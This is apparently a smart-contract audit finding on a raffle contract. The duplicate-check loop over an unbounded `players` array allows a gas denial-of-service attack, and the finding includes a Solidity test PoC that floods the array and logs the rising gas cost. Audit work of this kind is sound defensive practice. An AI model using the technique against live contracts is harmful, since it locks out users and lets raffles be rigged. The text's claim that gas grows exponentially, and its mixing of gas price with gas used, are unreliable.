### [S-#] Potencial Denial Of Service (DoS) Attack when calling `enterRaffle` function due to looping on `players` array searching for duplicates. 

**Description:**
`enterRaffle` function has a `for loop` that iterates over the `players` array. This `players` array is not bounded to a certain size, which means that we can add any number of items to the list. 
The larger this array becomes, the more the gas cost increases for each call to this function, reaching a point where the gas price is so high that it makes it practically impossible to access the service, rendering the protocol useless.
Down in this section is an example of how much to gas price increase as more players are added to the `players` array.

**Impact:** The gas cost for raffle impact will greatly increase as more players enter the raffle, discouraging later users from entering and causing a rush at the start of the raffle to be one of the first entrants in the queue.

An attacker can make the `players` array so big that no one else can enters. And also can enter a series of owned wallet addresses to guarenteeing that some of those addresses will win.  

**Proof of Concept:**
```javascript
    // AUDIT PoC
    function testDoSAttackOnEnterRaffle() public { 
        vm.txGasPrice(1);     
        uint256 playersToAdd = 99;

        // measure initial gas
        address[] memory initialPlayers = new address[](1);
        initialPlayers[0] = address(1);
        uint256 initialGas = gasleft();
        puppyRaffle.enterRaffle{ value: entranceFee }(initialPlayers);
        uint256 initialGasUsed = initialGas - gasleft();
        
        // Perform DoS
        address[] memory DoSPlayers = new address[](playersToAdd);
        for(uint256 i = 0; i<DoSPlayers.length; i++) {
            DoSPlayers[i] = address(i+2);
        }
        puppyRaffle.enterRaffle{ value: entranceFee * playersToAdd }(DoSPlayers);

        // measure final gas 
        address[] memory finalPlayers = new address[](1);
        finalPlayers[0] = address(101);
        uint256 finalInitialGas = gasleft();
        puppyRaffle.enterRaffle{ value: entranceFee }(finalPlayers);
        uint256 PostAttackGasUsed = finalInitialGas - gasleft();

        // asserts
        assert(initialGasUsed<PostAttackGasUsed);

        console.log("initial gas used:", initialGasUsed);
        console.log("post attack gas used:", PostAttackGasUsed);
        console.log("gas used incresed in a factor of aprox.", PostAttackGasUsed/initialGasUsed, " after attack");
    }
```
explanation of the above code snippet:
1. Perform a call to `enterRaffle` with just one player, and capture the gas used in this transacction on the variable `initialGasUsed`. 
2. *Perform the attack* Add a massive number of players to the raffle (in this case 99 players) to increase the size of `players`. 
3. Finally, repeat the step 1 by adding a single user and store the gas used on this transaction on the variable `postAttackGasUsed`. 
4. At the end, an assertion evaluates that gas price on the "postAttack" transaction is bigger than the initial one. And a series of logs shows how much the gas price increase. In this example, it increments in a factor of near 70 times the initial gas price. In other words, register 1 players becomes 70 times more expensive after add 100 players to the raffle. An the growth of gas price is exponential (O(c^n)) related to the length of the `players` array. 

**Recommended Mitigation:**
1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address. Also regardless the users enter the same wallet, they still have to pay for each one of such register. 
2.  Consider using a map to check for duplicates. For example, a map with the user address as key and a bool value where `true` means is already registered. This will decrease the amount of loops needed to check, because you will have to loop only on the `newPlayers` array. 
